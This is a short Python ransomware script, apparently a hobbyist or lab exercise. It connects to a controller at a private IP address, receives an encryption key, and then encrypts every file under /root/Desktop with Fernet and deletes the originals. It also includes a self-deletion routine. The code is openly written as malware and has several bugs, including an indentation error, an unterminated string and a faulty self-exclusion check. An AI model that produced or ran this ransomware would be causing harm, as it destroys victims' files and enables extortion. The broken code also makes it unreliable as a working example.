#!usr/bin/python 
# main malware ./././evil piece of code ../././

import uuid # for extracting the mac address.//some extra information of the target comouter...//

from cryptography.fernet import Fernet
import os
import socket
import sys
import base64

#START THE SOCKET SERVER
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("10.0.2.15", int(sys.argv[1]))) #("iP_ADDRESS", PORT)

enter = "RUNNNG THE MALWARE...././././"
exit = "STARTED THE VIRUS INFECTION...../././."

sock.send(enter.encode())
 # print(sock.recv(2048).decode())
key = sock.recv(2048)

print(key.encode()) # printing the base64 encoded aes key temporarlily for experimental purpose .../
sock.send(exit.encode())
sock.close()

#FILE ENCYPTING FUNCTION (DON'T TOUCH ANYTHING)
def file_ecrypt(key, name):
    
        if (name!="Ransomware.py"):
        with open(name,'rb') as f:
            data = f.read()

        fernet = Fernet(key)
        encrypted = fernet.encrypt(data)
        encrypted_file = name + ".encrypted"
        try:
            with open(encrypted_file, 'wb') as f:
                f.write(encrypted)
        
            os.remove(name)
        except:
            print("Error: Not Permitted")

            
def  remove_viruscode():
    # entring the temooray path in os.remove() for understanding purpose ///
    os.remove("/root/malware/main_virus.py")
    print("Removed the vrus code completely .../) 
   
#LIST ALL FILES FOR PARTICULAR FILE EXTENTIONS AND INVOKE FILE ENCTYPT FUNCTION.
def filelist():
   # mylist = [".txt",".pdf","png","jpg","docx","doc","xls","ppt","pptx","rar","zip",".mp3",".wmv",".mp4"]
    for root, dirs, files in os.walk("/root/Desktop"):
        for file in files:
    #        for ext in mylist:    
     #           if file.endswith(ext):
                    ally = os.path.join(root, file)
                    print(ally)
                    file_ecrypt(key, ally)
                         

filelist() #EXECUTING THE RANSOMWARE
# calling file removing function l.../
# remove_viruscode() 
# execution completed././././.good bye../././.
          
